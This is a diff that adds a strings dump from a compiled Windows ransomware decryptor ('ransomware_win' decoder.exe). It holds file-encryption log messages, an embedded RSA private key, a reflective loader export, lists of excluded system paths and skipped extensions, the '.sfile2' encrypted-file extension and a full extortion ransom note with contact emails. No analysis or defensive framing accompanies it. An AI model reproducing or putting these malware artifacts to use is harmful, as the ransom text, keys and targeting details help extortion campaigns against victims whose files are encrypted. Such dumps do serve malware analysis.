@@ -1,0 +1,834 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.reloc
+VC20XC00U
+;t$(v(
+UQPXY]Y[
+D$O;D$8
+)D$ vl
+QVPSh$
+L$L3L$D#L$<3L$L
+L$ 1T$
+T$ #T$0
+L$D3L$<#L$43L$D
+T$ #T$(
+3D$8#L$,#D$03D$@3L$<
+T$H1t$D3
+t$L#L$L#t$
+D$83D$03
+L$43L$,#L$$3L$4
+D$D1t$<
+T$H#L$D#t$
+L$,3L$$#L$
+t$<#t$L
+T$@#T$
+L$$3L$
+T$01t$,3
+t$4#L$4#t$D
+T$8#T$H
+#L$L3L$
+3D$ #D$
+T$(1t$$3
+t$,#L$,
+T$0#t$<#T$@
+3L$L#L$D3L$
+L$(1T$ 3
+D$$1t$
+T$(#L$$#D$(#t$4#T$8
+D$T_^[
+LSVj@3
+t-_^[]
+t-_^[]
+@SVWj4
+9~xv#3
+xSVWj@
+|IFVQ
+%33333
+%33333
+%33333
+%33333
+~P[_^]
+FL;FX~
+SVWjlj
+3T$(3L$,
+K$3C$_
+FD+FDP
+P(+Q$R
+AD+B@P
+Microsoft Hv
+ZZZZZZZZD3"
+decryptor.log
+Terminal failure: Unable to write to file.
+FILES : Found encoded file %ws
+WARN! FileLength more then memory has %ws
+%ws  -> WorkModeEnded
+%ws  -> WorkModeSorting
+%ws -> WorkModeFindFiles : %d files / %d folders found (already (de?)crypted %d/%d) (lf = %ws)...
+FOLDERS : Found folder %ws
+%ws -> WorkModeEncryptFiles : %d of %d files encrypted +%d [bps : %d, size = %d MB] (%d skipped, ld = %d.%d.%d %d:%d:%d, lf = %ws)...
+%ws -> WorkModeDecryptFiles : %d of %d files decrypted +%d (%d MB)...
+%s SORTING time : %s
+%ws DECRYPTFILES count : %d (%d skipped), time : %s
+ThreadParam->szDiskName; : %ws
+startTime : %d
+%ws FINDFILES time : %s
+EncryptDisk(%ws) DONE
+DISK : DONE for disk %ws
+%ws FINDFILES RESULTS : dwDirectoriesCount = %d, dwFilesCount = %d MB = %d (FIND END)
+ReadFile failed, err = %d
+CreateFileW failed, err = %d
+WriteFile failed, err = %d
+RtlCompressBuffer
+ntdll.dll
+RtlGetCompressionWorkSpaceSize
+ntdll.dll
+-nobackup
+leave ransom message here
+DECRYPT : Delete file %ws
+DECRYPT : Done backup file %ws
+DECRYPT : ERROR Cant backup file %ws : CopyFileW failed : %d
+ERROR_DISK_FULL : Cant create backup file. Disk is full! 
+DECRYPT : ERROR Cant backup file %ws : no memory
+MoveFileWithRansomExtenstion : ERROR %ws failed with error %d
+FilesReadEncryptedKeys : %ws readed
+DecryptAeskey : MACHINE NAME : %ws
+DecryptAeskey : ERROR  %ws NOT readed
+FilesReadEncryptedKeys : ERROR  %ws NOT readed
+EXCEPTION_IN_PAGE_ERROR : %ws
+UnmapViewOfFile : %ws failed with error %d
+MapViewOfFile : %ws failed with error %d
+CreateFileMappingW : ERROR %ws failed with error %d
+CreateFileW (append key) : ERROR  %ws failed with error %d
+SetFilePointer (append key) : ERROR %ws failed with error %d
+file appended
+WriteFile (append key) : ERROR  %ws failed with error %d
+CreateFileW : %ws failed with error %d
+ERROR cant encrypt file %ws 0 bytes length
+SelectWorkingAlgoByFileSize :ERROR  %ws returned null table entry
+DECRYPT : ERROR cant encrypt file %ws : 0 bytes length
+bRes=%d
+Failed OpenProcessToken
+Failed LookupPrivilegeValue
+Failed AdjustTokenPrivileges
+GetLogicalDriveStrings() : dwSize : %d
+DISK : START for disk %ws (type=%ws)
+DRIVE_FIXED : %ws
+APPLICATION : Work ended
+APPLICATION : Entry
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3x9bXaEDzkYA2LwuwYy0
+Jsvy02/JZPAox1LSMg26nnlM9VHU9R+JLC6kRAUkw/aw7aVk3bR0PdEvW/hBW1ls
+/Ry65PBhLCfVR9kao5jYKMOUEqSDvpw4BDgBcC4k0diJmOJjCBf7xPUT78HYSuTk
+Dg4ZCg9m6rNxQWiEziunl7fVfWHUoVSiKeGKNCc9Z1IsHDPEW+iEWGcf6YTldlIW
+tMW1nou7cvbV1TeKR2UEwi/fohfWT3eYvO8+BUgIhcQNZ1tlqNp2PvI+1o81b9NW
+nZW14bDLUOrSAe4lwv4IxAkSoJP0V7nTSQVZv3f8GHYdqJRpObPYfc9nAD1K78BC
+cwIDAQAB
+-----END PUBLIC KEY-----
+ failed
+ ! mbedtls_ctr_drbg_init returned -0x%04x
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA3x9bXaEDzkYA2LwuwYy0Jsvy02/JZPAox1LSMg26nnlM9VHU
+9R+JLC6kRAUkw/aw7aVk3bR0PdEvW/hBW1ls/Ry65PBhLCfVR9kao5jYKMOUEqSD
+vpw4BDgBcC4k0diJmOJjCBf7xPUT78HYSuTkDg4ZCg9m6rNxQWiEziunl7fVfWHU
+oVSiKeGKNCc9Z1IsHDPEW+iEWGcf6YTldlIWtMW1nou7cvbV1TeKR2UEwi/fohfW
+T3eYvO8+BUgIhcQNZ1tlqNp2PvI+1o81b9NWnZW14bDLUOrSAe4lwv4IxAkSoJP0
+V7nTSQVZv3f8GHYdqJRpObPYfc9nAD1K78BCcwIDAQABAoIBAQCj0MzvCEnYB7OV
+bUzS1DBsj68AKAHwdxcpiRhEoanTsnGbZ/J36ih3ZOM8AZ7Ftfie8qEE2fnCbTRd
+TP8HR7fqek6Jyic+GRzRfIe/d3e1LisoKNuFdgL2rfv4Vhi4bUhRFF3rUliKefmi
+PWtFSZpa62Tc6wP/67GKeWeQS6LnkzVcbHLRGvk/6A8qX24N375YbV8RDL5qwVcI
+YbMhd2hM4NPG36el45M82YwfTcaFrhofVUeUiYg0qCFibWnjomHXoFMCWuxJzfVE
+/kfkVnGll/ihaoDrH54TAN3tep7abhMGHH4d/CTq0j4/Ji5WH7yoGAmTHv1I9trL
+TwYxhW1pAoGBAO9b+qu3TbVPDf/veGyyrTcUZDzColdZYcXfrmM5NubT1ZmI25Dz
+MlGy0ZLTvg3A4RrJR9F2noDa3SFFRCK47/SbmN8iTfypWSefJXc7raiwgXRk16w0
+JX9RbXI9T/XA3LbYJ/c0HEVQZuDshPRQFHGuKQDBFhQzv5SBT+nSqLbvAoGBAO6i
+Zsv4Qpi2v05u5DgDzqFiAMRcQYCDOlq0eAF1WExIVqq5rOr13NMATnozVblMDjUV
+QU5RJBBdSeKuPa+PCU2koLCd36JW/fFxLxji0tjCmRlLq9lI2jx+svlH7czBt5sk
+YwylO+6FH6qA5XoSvRJOQRIFC1fDxmnDeHIZQgy9AoGBAMVhSO2vQ7JelYHW3Kxu
+Dy6bbyk3qx1yxJCiqrCB7sccKkjotX7rPTRnzDBS0aePxVEMaF/PfFdvo+gasVwc
+uysv4DkolbzjfXSR5RhUqxivLKFpwvvrKHy8Dg+lhbl3J8rTpulQHHwAGEYkZGL/
+Ykx4PLG1h9py7emtVNPRdnUbAoGBAI8gEn2lofPML8OQGQtLpUP/7qvXFWZJztcW
+RJ/DTLk77dcp0/98hPx8w5ThcznW1vKZk/iwC+xQt37guJiyNoc+BS7JEZdhi5+j
+HfdUG9fsJz0XuLNy0YnVB+0hagwT59aCJXIxLFfrukleU8Q6tvHiw35WTi5OepN2
+rKfqZEYVAoGAQjmfs6kY4M5CExVL57MwVBgfOc5kTpuvqrhlm3tNxTyoM7zZaAlV
+W+ur5C1NYzQ0GU6h+Q8QMDGOai6e8Bce69maQo7te29dqipjzbfAlD5a59WwO8EW
+rs3hXsjlJEIVxtZbQOnLdNsu5eSw7UuwuMt1ft4Cbs+/JOXF3GOwa68=
+-----END RSA PRIVATE KEY-----
+ failed
+ ! mbedtls_ctr_drbg_seed returned -0x%04x
+g_ComputerName : %ws
+aes key encrypted
+mbedtls_pk_encrypt success. RsaEncryptedAesKeyLength : %d
+aes key encryption failed
+mbedtls_pk_parse_public_key error : %d
+mbedtls_pk_parse_key : %p
+mbedtls_pk_parse_key error : %d
+mbedtls_pk_parse_key() success
+mbedtls_pk_decrypt : %p, outlen : %d
+%d:%d:%d:%d.%d
+WaitForHours() : gogogo
+WaitForHours() : waiting for sacred time... Expecting %d hours, now id %d
+ScheduleRoutine() : gogogo
+ScheduleRoutine() : waiting for sacred time... Expecting %d hours, now id %d
+TPOOL %ws (%p)
+FilesBeginEcnryptionWithNoMoreSpace (%p) for %s ms
+invalid PK
+-----END RSA PRIVATE KEY-----
+-----BEGIN RSA PRIVATE KEY-----
+-----END EC PRIVATE KEY-----
+-----BEGIN EC PRIVATE KEY-----
+-----END PRIVATE KEY-----
+-----BEGIN PRIVATE KEY-----
+-----END ENCRYPTED PRIVATE KEY-----
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+-----END RSA PUBLIC KEY-----
+-----BEGIN RSA PUBLIC KEY-----
+-----END PUBLIC KEY-----
+-----BEGIN PUBLIC KEY-----
+D7q/;M
+[^H_JI
+h^j@GPm|_}
+vr8^T:l)U
+=*\\E)
+LA\>Up
+?456789:;<=
+ !"#$%&'()*+,-./0123
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+ #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|
+6I*h<8
+ iciNWq
+Ze2Zh@
+A4x{%`
+BFUa.X
+w``u N
+:rsa.N
+eckey.Q
+RSA-alt
+RIPEMD160
+SHA224
+SHA256
+SHA384
+SHA512
+0123456789ABCDEF
+01DB42
+14DEF9DEA2F79CD65812631A5CF5D3ED
+8335DC163BB124B65129C96FDE933D8D723A70AADC873D6D54A7BB0D
+secp521r1
+brainpoolP512r1
+secp384r1
+brainpoolP384r1
+secp256r1
+secp256k1
+brainpoolP256r1
+secp224r1
+secp224k1
+secp192r1
+secp192k1
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,
+DEK-Info: DES-CBC,
+DEK-Info: AES-
+DEK-Info: AES-128-CBC,
+DEK-Info: AES-192-CBC,
+DEK-Info: AES-256-CBC,
+id-at-commonName
+Common Name
+id-at-countryName
+Country
+id-at-locality
+Locality
+id-at-state
+id-at-organizationName
+Organization
+id-at-organizationalUnitName
+Org Unit
+emailAddress
+E-mail address
+id-at-serialNumber
+Serial number
+serialNumber
+id-at-postalAddress
+Postal address
+postalAddress
+id-at-postalCode
+Postal code
+postalCode
+id-at-surName
+Surname
+id-at-givenName
+Given name
+id-at-initials
+Initials
+initials
+id-at-generationQualifier
+Generation qualifier
+generationQualifier
+id-at-title
+id-at-dnQualifier
+Distinguished Name qualifier
+dnQualifier
+id-at-pseudonym
+Pseudonym
+pseudonym
+id-domainComponent
+Domain component
+id-at-uniqueIdentifier
+Unique Identifier
+uniqueIdentifier
+id-ce-basicConstraints
+Basic Constraints
+id-ce-keyUsage
+Key Usage
+id-ce-extKeyUsage
+Extended Key Usage
+id-ce-subjectAltName
+Subject Alt Name
+id-netscape-certtype
+Netscape Certificate Type
+id-kp-serverAuth
+TLS Web Server Authentication
+id-kp-clientAuth
+TLS Web Client Authentication
+id-kp-codeSigning
+Code Signing
+id-kp-emailProtection
+E-mail Protection
+id-kp-timeStamping
+Time Stamping
+id-kp-OCSPSigning
+OCSP Signing
+md5WithRSAEncryption
+RSA with MD5
+sha-1WithRSAEncryption
+RSA with SHA1
+sha224WithRSAEncryption
+RSA with SHA-224
+sha256WithRSAEncryption
+RSA with SHA-256
+sha384WithRSAEncryption
+RSA with SHA-384
+sha512WithRSAEncryption
+RSA with SHA-512
+ecdsa-with-SHA1
+ECDSA with SHA1
+ecdsa-with-SHA224
+ECDSA with SHA224
+ecdsa-with-SHA256
+ECDSA with SHA256
+ecdsa-with-SHA384
+ECDSA with SHA384
+ecdsa-with-SHA512
+ECDSA with SHA512
+RSASSA-PSS
+rsaEncryption
+id-ecPublicKey
+Generic EC key
+id-ecDH
+EC key for ECDH
+brainpool256r1
+brainpool384r1
+brainpool512r1
+desCBC
+DES-CBC
+des-ede3-cbc
+DES-EDE3-CBC
+id-md5
+id-sha1
+id-sha224
+SHA-224
+id-sha256
+SHA-256
+id-sha384
+SHA-384
+id-sha512
+SHA-512
+hmacSHA1
+HMAC-SHA-1
+hmacSHA224
+HMAC-SHA-224
+hmacSHA256
+HMAC-SHA-256
+hmacSHA384
+HMAC-SHA-384
+hmacSHA512
+HMAC-SHA-512
+pbeWithSHAAnd3-KeyTripleDES-CBC
+PBE with SHA1 and 3-Key 3DES
+pbeWithSHAAnd2-KeyTripleDES-CBC
+PBE with SHA1 and 2-Key 3DES
+AES-128-ECB
+AES-192-ECB
+AES-256-ECB
+AES-128-CBC
+AES-192-CBC
+AES-256-CBC
+AES-128-CFB128
+AES-192-CFB128
+AES-256-CFB128
+AES-128-OFB
+AES-192-OFB
+AES-256-OFB
+AES-128-CTR
+AES-192-CTR
+AES-256-CTR
+AES-128-XTS
+AES-256-XTS
+AES-128-GCM
+AES-192-GCM
+AES-256-GCM
+AES-128-CCM
+AES-192-CCM
+AES-256-CCM
+CAMELLIA-128-ECB
+CAMELLIA-192-ECB
+CAMELLIA-256-ECB
+CAMELLIA-128-CBC
+CAMELLIA-192-CBC
+CAMELLIA-256-CBC
+CAMELLIA-128-CFB128
+CAMELLIA-192-CFB128
+CAMELLIA-256-CFB128
+CAMELLIA-128-CTR
+CAMELLIA-192-CTR
+CAMELLIA-256-CTR
+CAMELLIA-128-GCM
+CAMELLIA-192-GCM
+CAMELLIA-256-GCM
+CAMELLIA-128-CCM
+CAMELLIA-192-CCM
+CAMELLIA-256-CCM
+DES-ECB
+DES-EDE-ECB
+DES-EDE-CBC
+DES-EDE3-ECB
+BLOWFISH-ECB
+BLOWFISH-CBC
+BLOWFISH-CFB64
+BLOWFISH-CTR
+ARC4-128
+CHACHA20
+CHACHA20-POLY1305
+****************
+D:\code\ransomware_win\bin\decoder.pdb
+.text$mn
+.idata$5
+.rdata
+.rdata$zzzdbg
+.xdata$x
+.edata
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+decoder.exe
+_ReflectiveLoader@4
+wvnsprintfA
+StrCmpIW
+StrCpyNW
+PathFindExtensionW
+PathFindFileNameW
+StrStrIA
+StrCatW
+StrCpyW
+StrDupW
+SHLWAPI.dll
+_aullshr
+memset
+_stricmp
+_wcslwr
+RtlTimeToTimeFields
+NtCreateFile
+NtWaitForSingleObject
+RtlInitUnicodeString
+NtClose
+NtQueryDirectoryFile
+_allshr
+memcmp
+wcsstr
+RtlUpcaseUnicodeChar
+ntdll.dll
+RtlUnwind
+NtQueryVirtualMemory
+GlobalMemoryStatus
+LocalAlloc
+GetProcessHeap
+GetProcessTimes
+GetProcessWorkingSetSize
+GetCurrentProcess
+GetCurrentProcessId
+GetCurrentThread
+GetCurrentThreadId
+GetThreadTimes
+GetLastError
+SetLastError
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+GetTickCount
+GetStartupInfoW
+QueryPerformanceCounter
+LocalFree
+GetStdHandle
+WriteFile
+FlushFileBuffers
+CloseHandle
+lstrlenA
+ExpandEnvironmentStringsA
+OutputDebugStringA
+CreateFileA
+CreateThread
+ExitThread
+DeleteCriticalSection
+lstrcpyW
+lstrcatW
+TlsAlloc
+ExpandEnvironmentStringsW
+GetProcAddress
+GetFileSize
+GetFileSizeEx
+ReadFile
+SetEndOfFile
+SetFilePointer
+SetFilePointerEx
+MapViewOfFile
+UnmapViewOfFile
+TlsGetValue
+TlsSetValue
+CreateFileMappingA
+CreateFileMappingW
+LoadLibraryA
+GetCommandLineA
+CreateFileW
+SetFileAttributesW
+GetFileAttributesW
+DeleteFileW
+CopyFileW
+MoveFileW
+ExitProcess
+WaitForSingleObject
+GetLogicalDriveStringsW
+GetDriveTypeW
+Wow64DisableWow64FsRedirection
+AllocConsole
+AttachConsole
+GetSystemTime
+GetComputerNameW
+GetLocalTime
+WaitForMultipleObjects
+HeapAlloc
+HeapFree
+QueryPerformanceFrequency
+KERNEL32.dll
+GetProcessWindowStation
+GetMessagePos
+GetMessageTime
+GetClipboardOwner
+GetClipboardViewer
+GetOpenClipboardWindow
+GetActiveWindow
+GetFocus
+GetInputState
+GetQueueStatus
+GetCapture
+GetCursorPos
+GetCaretPos
+GetDesktopWindow
+wsprintfW
+MessageBoxA
+wsprintfA
+USER32.dll
+CryptAcquireContextW
+CryptGenRandom
+OpenProcessToken
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+CryptReleaseContext
+ADVAPI32.dll
+strstr
+_vsnprintf
+_alldiv
+_allmul
+_allshl
+_aulldiv
+memcpy
+Your network has been penetrated.
+All files on each host in the network have been encrypted with a strong algorithm.
+Backups, replications were either encrypted or wiped. Shadow copies also removed.
+DO NOT RESET OR SHUTDOWN - files may be damaged.
+DO NOT RENAME OR MOVE the encrypted and readme files.
+DO NOT DELETE *.sfile2 files.
+This may lead to the impossibility of recovery of the certain files.
+To get info how to decrypt your files, contact us at:
+usausa@ctemplar.com
+johnycashusa@protonmail.ch
+To confirm our honest intentions we will decrypt few files for free.
+Send 2 different files with extension *.sfile2. Files should not contain essential information.
+Files should be inside ZIP archive and mailed to us (SUBJ : your domain or network name).
+It can be from different computers on your network to be sure we decrypts everything.
+The procedure to decrypt the rest is simple:
+After payment we will send you decryption software.
+Don't waste time, send email with files attached as soon as possible.
+It's just a business. We absolutely do not care about you and your deals, except getting benefits.
+If we do not do our work and liabilities - nobody will not cooperate with us. It's not in our interests.
+If you will not cooperate with our service - for us, it's doesn't matter. But you will lose your time and data, cause just we have the private key.
+;?<Y<b<'=<=x=
+=Z>f>s>
+?=?J?Q?
+0#1X1r1
+3I3Y3s3
+404:4Q4e4p4
+5)545n5
+6 6+6b6v6
+7'7`7q7
+8B8S8f8u8
+8.9;9T9j9y9
+95:D:X:l:w:
+::;N;c;x;
+='=1=R=_=w=
+=!>0>D>X>c>
+?)?4?Z?h?x?
+!050J0_0m0
+2"2)2>2M2T2[2g2n2x2
+3(525>5H5e5l5x5
+6"6.6;6P6`6m6z6
+747;7H7R7p7w7
+8#8/8G8Y8p8}8
+;;@;G;T;a;z;
+<?<F<R<k<z<
+='=4=R=\=i=y=
+>>7>I>d>q>
+B2X2h2{2
+2&2,2_3e30474C4V4\4e4k4s7|7
+353Q4Z4
++020{1
+4"4g5n5
+O?U?e?
+:1:D:i:t:
+;/<A<g<y<
+1\2m2s2~2
+2)303M3T3
+6*6[6n6
+6'7:7k7~7
+8:8M8~8
+9O:_:f:o:
+;B<I<e<y<1>7>G>l>
+2#292L2
+3&4-4D4[4b4q4
+6N6c6h6n6t6z6
+>+>@>G>
+>0E0o0
+2:2O2V2M3T3~3
+:&;9;@;
+2O6>7Q7\7q7
+73=9=J=r=
+8U8f8l8z8
+979r;x;
+;3<D<K<
+c1n1~1
+2,272=2P2u2
+2E3C7I7Y7~7
+9,939p9w9~9
+:(:/:6:=:H:O:c:j:q:x:
+;!;(;/;6;=;D;X;_;f;m;t;{;
+<,<0<4<8<<<@<D<H<L<P<T<X<\<
+3"3,3C3V3\3e3q3
+5.6A6q6
+6727c7v7
+88c8v8}8
+G2M2]2
+/1:1J1U1[1c1i1
+3 333c4j4H5O5
+7%>+>;>`>
+1&393@3
+708?8F8Q8X8]8
+$191N1]1
+1U4[4#5+5'7
+:&:/:5:<:c:
+8%8,8p9
+<n=s=z=
+?4?8?<?@?D?H?L?|?
+9L9_9f97:>:l:
+<7<><l<
+3A3h3w3
+5#5:5D5`5g5
+<.<5<G<N<r<y<
+=7=>=P=W={=
+>">@>G>Y>`>
+?$?+?C?P?b?i?
+0-040R0Y0h0r0
+1$161=1[1b1t1{1
+2&2-2?2F2d2k2}2
+3/363H3O3m3t3
+70777I7P7n7u7
+898@8R8Y8w8~8
+9!9B9I9[9b9
+:#:*:K:R:d:k:
+;,;3;T;[;m;t;
+<#<5<<<]<d<v<}<
+=%=,=>=E=f=m=
+>.>5>G>N>o>v>
+?5?<?N?U?w?~?
+0%0@0M0_0f0
+1!131:1[1b1q1{1
+2/262H2O2p2w2
+3 3D3K3]3d3
+4.454Y4`4r4y4
+5*515C5J5n5u5
+6?6F6X6_6
+7$7-7Q7X7p7w7
+8"848;8\8c8u8|8
+9/969H9O9p9w9
+: :D:K:]:d:
+;.;5;Y;`;r;y;
+<<1<C<J<n<u<
+=<=C=X=_=
+>$>->T>[>m>t>
+> ?'?9?B?i?p?
+02090K0R0
+0)0/0B0H0
+2G9T9y9
+2&2z2q3x3
+1.2J2Q2
+2!3-3@3G3
+7,7P7^7e7
+<*<1<l<
+>,?B?I?
+;;);3;=;G;Q;[;e;o;y;
+<!<+<5<?<I<S<]<g<
+%4n4v4#=0=9=R=_=h=@>M>V>o>|>
+1 1/1>1M1\1k1z1
+2#272T2
+313H3V3p3
+4"4(404K4S4Y4e4
+5&5/555A5[5a5l5r5z5
+666<6F6L6T6p6y6
+7$7*717L7U7g7s7
+8!8*808<8O8U8`8f8m8
+:6:>:D:P:i:o:
+;$;*;4;D;I;O;b;w;~;
+?:?N?z?
+0$0.080B0S0k0
+1J1[1z1
+1$2L2S2e2l2v2
+4A5K5U5_5i5s5}5
+6$6+62696@6G6N6U6\6c6j6q6x6
+<"<6<H<
+<C=L=Q=^=h=o=
+>9?E?c?
+222272D2]2
+5)565C5P5]5j5w5
+6 6-6:6G6T6a6n6{6
+:';Q;[;
+0 2?2\2z2
+3&363N3c3
+3G4N4d4q4x4
+5D6b6g6q6
+7*777O7
+='=4=M=t=
+=.>I>W>e>
+2 2/2<2O2[2j2
+5,5A5Q5
+5.656>6`6n6s6
+9A9F9M9T9[9b9l9p9t9x9
+:1:a:n:{:
+33)3d3
+5&5+5S5f5
+6*6;6@6E6a6q6
+8 9;9d9
+9+:;:t:
+;B<g<q<
+>B?U?\?o?w?~?
+3$3*30363<3B3H3N3T3Z3`3f3l3r3x3~3
+4 4&4,42484>4D4J4P4V4\4b4h4n4t4z4
+5"5(5.545:5@5F5L5R5X5^5d5j5p5v5|5
+4 4$4(4,44484<4@4D4H4L4P4T4X4\4d4h4l4
+X0d0p0|0
+1$1(10181<1`1h1l1t1|1
+20282<2D2L2P2X2`2d2l2t2x2
+3 3(3,343<3@3H3P3T3\3d3h3p3x3|3
+4 4$40484<4H4P4T4`4h4l4x4
+5 5$5@5H5L5X5`5d5
+6 6$6(6064686<6D6H6L6P6X6\6`6d6l6p6t6x6
+7 7$7(7,74787<7@7H7L7P7T7\7`7d7h7p7t7x7
+8$8084888<8@8D8H8L8T8`8d8h8l8p8t8x8|8
+5$5,545<5D5L5T5\5d5l5t5|5
+6$6,646<6D6L6T6\6d6l6t6|6
+7$747<7@7X7\7`7d7l7p7
+8$848<8@8D8L8X8\8`8d8t8
+9$949D9T9d9t9
+:$:4:D:T:d:t:
+;$;4;D;T;d;t;
+<$<(<,<0<4<D<T<d<t<
+=$=4=X=\=`=d=
+>$>,>0>4><>H>L>P>T>d>t>
+?8?<?@?D?L?P?T?X?\?h?l?p?t?
+4888D8H8
+Microsoft Enhanced Cryptographic Provider v1.0
+diagcab
+diagpkg
+msstyles
+nomedia
+themepack
+deskthemepack
+sfile2
+sfile3
+sfile4
+sfile5
+sfile2
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+bootmgr
+%windir%
+:\$RECYCLE.BIN\
+\windows\system32\
+\windows\syswow64\
+\windows\system\
+\windows\winsxs\
+\System\msadc\
+\Common Files\
+\WindowsPowerShell\
+\all users\microsoft\
+\Program Files\Internet Explorer\
+:\system volume information\
+\Program Files\Microsoft Games\
+\inetpub\logs\
+:\boot\
+:\drivers\
+:\wsus\
+\cache\
+\cache2\
+\far manager\
+\ida 7.0\
+\ida 6.8\
+\Default\Extensions\
+\Temporary Internet Files\
+\Microsoft\
+\Temp\
+$windows.~bt
+$windows.~ws
+\google\
+\mozilla\
+\tor browser\
+\windows.old\
+\intel\
+\msocache\
+\perflogs\
+\??\%ws
+.sfile2
+.sfile2
+.backup
+DRIVE_FIXED
+DRIVE_REMOTE
+DRIVE_REMOVABLE
+DRIVE_CDROM
+UNKNOWN
+d:\enc_tests\
+!!_FILES_ENCRYPTED_.txt
